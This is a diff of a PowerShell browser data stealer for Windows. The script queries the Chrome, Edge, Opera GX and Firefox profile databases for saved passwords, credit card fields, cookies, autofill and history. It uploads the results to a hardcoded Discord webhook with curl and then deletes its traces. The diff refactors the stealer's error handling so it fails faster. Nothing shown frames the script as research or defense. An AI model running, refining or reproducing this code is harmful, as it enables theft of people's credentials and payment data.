@@ -4,6 +4,12 @@
 
 # Target OS: Windows 10, 11
 
+# Validate the presence of sqlite3.exe to avoid repeated checks
+$sqliteCommand = "sqlite3.exe"
+if (-not (Test-Path $sqliteCommand)) {
+    throw "sqlite3.exe not found. Exiting script."
+}
+
 function Get-BrowserData {
     [CmdletBinding()]
     param (
@@ -40,52 +46,38 @@ function Get-BrowserData {
             elseif ($DataType -eq 'autofill') { "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Web Data" }
             elseif ($DataType -eq 'history') { "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History" }
         }
-        default { Write-Error "Unsupported browser or data type specified."; return }
+        default { throw "Unsupported browser or data type specified." }
     }
 
     if (-not (Test-Path $Path)) {
-        Write-Warning "The path for $Browser $DataType could not be found."
-        return
+        throw "The path for $Browser $DataType could not be found."
     }
 
     try {
-        $sqliteCommand = "sqlite3.exe"
         if ($DataType -eq 'passwords' -and ($Browser -eq 'chrome' -or $Browser -eq 'edge' -or $Browser -eq 'opera')) {
             $query = "SELECT origin_url, username_value, password_value FROM logins"
-            if (Test-Path $sqliteCommand) {
-                $passwordData = & $sqliteCommand $Path $query
-                Write-Output "[$Browser Passwords]: $passwordData"
-            } else {
-                Write-Warning 'sqlite3.exe not found. Unable to extract passwords.'
-            }
+            $passwordData = & $sqliteCommand $Path $query
+            Write-Output "[$Browser Passwords]: $passwordData"
         } elseif ($DataType -eq 'passwords' -and $Browser -eq 'firefox') {
             $firefoxData = Get-Content -Path $Path | ConvertFrom-Json
             Write-Output "[Firefox Passwords]: $($firefoxData.logins)"
         } elseif ($DataType -eq 'creditcards' -and ($Browser -eq 'chrome' -or $Browser -eq 'edge' -or $Browser -eq 'opera')) {
             $query = "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"
-            if (Test-Path $sqliteCommand) {
-                $creditCardData = & $sqliteCommand $Path $query
-                Write-Output "[$Browser Credit Cards]: $creditCardData"
-            } else {
-                Write-Warning 'sqlite3.exe not found. Unable to extract credit card information.'
-            }
+            $creditCardData = & $sqliteCommand $Path $query
+            Write-Output "[$Browser Credit Cards]: $creditCardData"
         } elseif ($DataType -eq 'cookies' -or $DataType -eq 'autofill' -or $DataType -eq 'history') {
             $query = switch ($DataType) {
                 'cookies' { "SELECT host_key, name, encrypted_value FROM cookies" }
                 'autofill' { "SELECT name, value FROM autofill" }
                 'history' { "SELECT url, title, visit_count FROM urls" }
             }
-            if (Test-Path $sqliteCommand) {
-                $data = & $sqliteCommand $Path $query
-                Write-Output "[$Browser $DataType]: $data"
-            } else {
-                Write-Warning 'sqlite3.exe not found. Unable to extract data.'
-            }
+            $data = & $sqliteCommand $Path $query
+            Write-Output "[$Browser $DataType]: $data"
         } else {
-            Write-Warning "Unsupported data type for $Browser."
+            throw "Unsupported data type for $Browser."
         }
     } catch {
-        Write-Error "Failed to extract $DataType from $Browser: $($_.Exception.Message)"
+        throw "Failed to extract $DataType from $Browser: $($_.Exception.Message)"
     }
 }
 
@@ -94,8 +86,7 @@ $dc = 'https://discord.com/api/webhooks/1225028544258641981/kmftS6B2qpwjcNBn3ovP
 
 # Check if Discord webhook is set
 if ([string]::IsNullOrEmpty($dc)) {
-    Write-Error 'No exfiltration method set. Exiting.'
-    exit
+    throw 'No exfiltration method set. Exiting.'
 }
 
 # Collect browser data in parallel
@@ -124,7 +115,7 @@ try {
     # Wait for all jobs to complete
     $jobs | ForEach-Object { $_ | Wait-Job; Remove-Job $_ }
 } catch {
-    Write-Error "Failed to collect browser data: $_"
+    throw "Failed to collect browser data: $($_.Exception.Message)"
 }
 
 # Combine all output files into one
@@ -135,8 +126,7 @@ Get-ChildItem -Path $outputDir -Filter *.txt | ForEach-Object {
 
 # Ensure output file is not empty
 if (-not (Test-Path $outputFile) -or (Get-Item $outputFile).Length -eq 0) {
-    Write-Error "No data collected. Exiting."
-    exit
+    throw "No data collected. Exiting."
 }
 
 # Send completion notification to Discord
@@ -145,10 +135,10 @@ try {
     Invoke-RestMethod -Uri $dc -Method Post -Body $body -ContentType 'application/json' -UseBasicParsing
     $response = curl.exe -F "file1=@$outputFile" $dc
     if ($LASTEXITCODE -ne 0) {
-        Write-Error "Failed to upload file to Discord webhook. Response: $response"
+        throw "Failed to upload file to Discord webhook. Response: $response"
     }
 } catch {
-    Write-Error "Failed to send notification to Discord webhook: $_"
+    throw "Failed to send notification to Discord webhook: $($_.Exception.Message)"
 }
 
 # Clean up
@@ -156,5 +146,5 @@ try {
     Remove-Item -Path $outputDir -Recurse -Force -ErrorAction SilentlyContinue
     Remove-Item -Path $outputFile -Force -ErrorAction SilentlyContinue
 } catch {
-    Write-Warning "Failed to clean up the output files: $_"
+    throw "Failed to clean up the output files: $($_.Exception.Message)"
 }
